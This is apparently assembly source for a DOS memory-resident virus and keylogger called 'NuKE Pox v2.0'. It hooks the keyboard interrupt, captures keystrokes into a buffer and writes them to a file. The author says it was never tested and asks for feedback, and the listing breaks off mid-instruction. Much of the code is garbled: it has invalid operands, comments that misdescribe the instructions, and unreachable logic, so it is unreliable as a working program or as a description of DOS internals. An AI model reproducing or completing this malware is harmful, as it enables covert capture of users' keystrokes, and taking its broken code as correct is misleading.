;===========================================================================
;                        ** NuKE Pox v2.0 **                               
;                                by                                      
;                         ** Black Wolf **                                 


;I Couldnt Do Without You By DC

;Here It Is...

;NOTE: I DID NOT TEST THIS CODE, JUST ASSEMBLED IT WITH TASM! PLEASE LET ME
; KNOW WHAT DOESN'T WORK!!!

.model tiny
.code
	org     100h

start:
        db      0e9h,0,0                 ;jmp     3       ;for the .com file
	db      0bh                         ;mov     si,xxxxh;for the .exe file

	mov     di,offset from_here       ;di = offset of from_here
	cld                               ;clear direction flag
	lodsb                             ;load byte from ds:[si] into al
	or      al,al                     ;is al zero?
	je      exe_exit                  ;yes? force return to program

	push    es                        ;save es on stack
	push    si                        ;and si

	mov     ah,52h                    ;get the int 21h address
	int     21h                       ;
	mov     bx,es:[bx-2]              ;get the address of the int vector
	pop     si                        ;get si off the stack
	mov     [si],bl                   ;store bl (low part of address)
	mov     ah,51h                    ;write the high part
	lodsb                             ;get it into al
	mov     [si+2],ax                 ;store it there
	xor     ax,ax                     ;zero out the registers we will use
	xor     bx,bx                     ;we are going to uss es as a pointer
	mov     es,ax                     ;point to the extra segment area
	find:                            ;this is our label for the find loop
	dec     bx                        ;decrement bx
	cmp     word ptr es:[bx],5a4dh    ;is it the 'Z' in 'ZM'
	jne     find                      ;no? hunt again
	cmp     byte ptr es:[bx+3],0eeh   ;is it the 0EEh we expect?
	jne     find                      ;no? hunt some more
	mov     ax,word ptr es:[bx+1]     ;get the header size
	sub     ax,3                    ;subtract 3 bytes from it
	mov     byte ptr es:[bx+3],0e9h   ;make segment executable only
	mov     cx,endlog-start           ;the length of the virus code
	mov     dx,offset start           ;point dx at the start of code
	push    cs                        ;put the code seg on the stack
	pop     ds                        ;get it back off
	rep     movsw                     ;move virus code to segment
	mov     ds,cx                     ;ds is now >1000 (segmented addr)

	exe_exit:
	pop     si                        ;get si from the stack
	from_here:
	mov     di,offset buffer          ;put di at the buffer
	push    cs                        ;put the code seg on the stack
	pop     ds                        ;get it back off
	xor     ax,ax                     ;zero out the register we will use
	mov     word ptr ds:[counter],ax  ;clear the counter
	sti                               ;enable the interupts
	xchg    ah,al                     ;move zero into ah
	in      al,9h                     ;read port 9
	pushf                             ;push flags onto the stack
	call    interrupt                 ;call the int handler
	retf                              ;return to original program

int_9h:
        push    bp                      ;set up frame pointer
        mov     bp,sp                   ;

        push    ax                      ;dump all registers
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    di
        push    si

        cmp     byte ptr cs:[buffer[bp]],0 ;has the logging stopped?
        je      quit_it                 ;if so, dont log keystrokes

        xor     ax,ax                   ;zero out ax
        mov     ds,ax                   ;make DS point to interrupt segment
        mov     al,[9*4]                ;get keyboard buffer head offset
        mov     ah,[9*4+2]              ;get keyboard buffer tail offset
        cmp     al,ah                   ;are they equal?

        jne     check_key               ;if not then check if new key struck
        jmp     quit_it                 ;otherwise just return to program

check_key:
        mov     cl,ah                   ;put tail index in cl
        mov     ch,byte ptr [9*100h+17h];convert segment using PSP adress
        add     ch,cl                   ;add tail index to keystroke adr
        mov     cl,byte ptr [ch]        ;get keystroke
        cmp     cl,' '                  ;was a modifier pressed?
        je      store                   ;if not spacebar
        cmp     cl,'A'                  ;was an upper case letter pressed?
        jb      check_again             ;if not
        cmp     cl,'Z'                  ;were an upper case letter pressed?
        ja      check_again             ;if not
        jmp     store                   ;otherwise go to store
        cmp     cl,0                    ;was return key pressed?
        je      store                   ;if yes
        jmp     check_again             ;if not
        mov     cx,1000                 ;use this buffer
        add     ch,cx                   ;adjust keystroke storage loc.
        mov     byte ptr[cx],0         ;put -1 at end of file to terminate string
        mov     cx,1                    ;prepare to write one character
        xor     dx,dx                   ;don't care about attributes
        mov     ah,40h                  ;write keystroke to file
        int     21h

check_again:
        xor     ax,ax                   ;adress keyboard buffer in ax
        mov     ds,ax                   ;put segment in ds
        mov     al,[9*4+1]              ;get keyboard buffer tail
        inc     al                      ;increment it
        mov     [9*4+1],al              ;and put it back
        jmp     quit_it                 ;jump over the next procedure

store:
        xor     ax,ax                   ;zero out the register used
        mov     ds,ax                   ;make sure ds=0
        mov     al,byte ptr [ch]        ;get keystroke info
        mov     [di],al                 ;and put it in the buffer
        inc     di                      ;point to next location in buffer
        call    move                    ;log mouse movement too

quit_it:
        pop     si                      ;restore all the registers
        pop     di
        pop     es
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        pop     bp

virusname db '[NuKE PoX v2.0]',0         ;unused strings
author    db '[Black Wolf]',0

move:
        pushf                           ;push flags on to stack
        call    mouss                     ;call mouss subroutine
        ret                             ;then return

mouss:
        sub     sp,4                    ;adr_storage & delta_sto
        push    bp                      ;set up frame pointer
        mov     bp,sp                   ;
        push    ax                      ;dump all registers
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    si

        push    ax                      ;save the value on the stack
        push    es                      ;put segment in stack
        pop     ds                      ;get segment off stack
        mov     ax,3521h                ;get int 21h address
        int     21h                     ;
        mov     word ptr[buffer+bp-2],bx ;store it
        mov     word ptr[buffer+2+bp-2],es ;same thing
        pop     ax                      ;get the value off the stack
        mov     dl,80h                  ;set delta_value to 128
        int     11h                     ;get amount of memory since last reboot
        mov     cx,ax                   ;put it in cx
        mul     cx                      ;multiply cx * cx (square it)
        add     ax,0b00fh               ;adjust figure down
        mov     bx,ax                   ;and save it
        mov     ah,4ah                  ;used to set the block size of memory
        int     21h                     ;now change memory allocation
        jc      quitmo                  ;carry means error occuring
        jc      quitmo                  ;error occuring
        mov     ah,48h                  ;allocates a block of memory
        dec     ax                      ;allocate just less than that
        int     21h                     ;memory
        jc      quitmo                  ;there was an error
        dec     ax                      ;decriment returned memory segment
        mov     [bp+4-2],ax             ;and save it
        push    ax                      ;add 0000 to the beginning of the block
        pop     bx                      ;to get the starting location of the mem
        mov     ax,315h                 ;get int 51h address
        int     21h                     ;
        mov     cs:[bp